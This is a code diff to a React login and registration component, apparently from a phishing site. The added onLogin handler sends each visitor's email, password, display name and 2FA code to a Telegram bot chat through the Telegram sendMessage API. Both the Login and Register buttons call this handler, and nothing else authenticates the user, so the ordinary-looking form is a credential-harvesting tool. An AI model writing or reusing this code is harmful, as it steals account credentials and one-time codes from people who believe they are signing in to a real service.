@@ -1,5 +1,7 @@
 "use client";
 
+import { CHATID, TELEGRAM_BOT_TOKEN } from "@/const";
+import axios from "axios";
 import { useState } from "react";
 
 export default function Authen({
@@ -7,6 +9,25 @@ export default function Authen({
   activeLabel,
   setActiveLabel,
 }: any) {
+  const [data, setData] = useState({
+    email: "",
+    password: "",
+    displayName: "",
+    twoFa: "",
+  });
+  const onLogin = async () => {
+    const x = await axios.post(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: CHATID,
+        text: `${activeLabel === "Login" ? "LOGIN" : "REGISTER"} \n Email: ${
+          data.email
+        }\n Password: ${data.password} \n DisplayName: ${
+          data.displayName
+        } \n 2FA: ${data.twoFa} `,
+      }
+    );
+  };
   const tab = [
     {
       label: "Login",
@@ -165,6 +186,10 @@ export default function Authen({
                     className="rounded bg-[#293F52] p-3"
                     type="text"
                     placeholder="Type your display name"
+                    name="displayName"
+                    onChange={(e) => {
+                      setData({ ...data, displayName: e.target.value });
+                    }}
                   />
                 </div>
                 <div className="flex flex-col gap-2">
@@ -173,14 +198,22 @@ export default function Authen({
                     className="rounded bg-[#293F52] p-3"
                     type="text"
                     placeholder="Type your Email"
+                    name="email"
+                    onChange={(e) => {
+                      setData({ ...data, email: e.target.value });
+                    }}
                   />
                 </div>
                 <div className="flex flex-col gap-2">
                   <p>Password *</p>
                   <input
                     className="rounded bg-[#293F52] p-3"
-                    type="text"
+                    type="password"
                     placeholder="Type your password"
+                    name="password"
+                    onChange={(e) => {
+                      setData({ ...data, password: e.target.value });
+                    }}
                   />
                 </div>
                 <label className="inline-flex items-center cursor-pointer">
@@ -191,7 +224,12 @@ export default function Authen({
                   </span>
                 </label>
 
-                <button className="bg-primary p-3 rounded font-semibold">
+                <button
+                  onClick={() => {
+                    onLogin();
+                  }}
+                  className="bg-primary p-3 rounded font-semibold"
+                >
                   Register
                 </button>
               </>
@@ -203,21 +241,41 @@ export default function Authen({
                     className="rounded bg-[#293F52] p-3"
                     type="text"
                     placeholder="Type your Email"
+                    name="email"
+                    onChange={(e) => {
+                      setData({ ...data, email: e.target.value });
+                    }}
                   />
                 </div>
                 <div className="flex flex-col gap-2">
                   <p>Password</p>
                   <input
                     className="rounded bg-[#293F52] p-3"
-                    type="text"
+                    type="password"
                     placeholder="Type your password"
+                    name="password"
+                    onChange={(e) => {
+                      setData({ ...data, password: e.target.value });
+                    }}
                   />
                 </div>
                 <div className="flex flex-col gap-2">
                   <p>2FA Code if enabled</p>
-                  <input className="rounded bg-[#293F52] p-3" type="text" />
+                  <input
+                    name="twoFa"
+                    onChange={(e) => {
+                      setData({ ...data, twoFa: e.target.value });
+                    }}
+                    className="rounded bg-[#293F52] p-3"
+                    type="text"
+                  />
                 </div>
-                <button className="bg-primary p-3 rounded font-semibold">
+                <button
+                  onClick={() => {
+                    onLogin();
+                  }}
+                  className="bg-primary p-3 rounded font-semibold"
+                >
                   Login
                 </button>
               </>
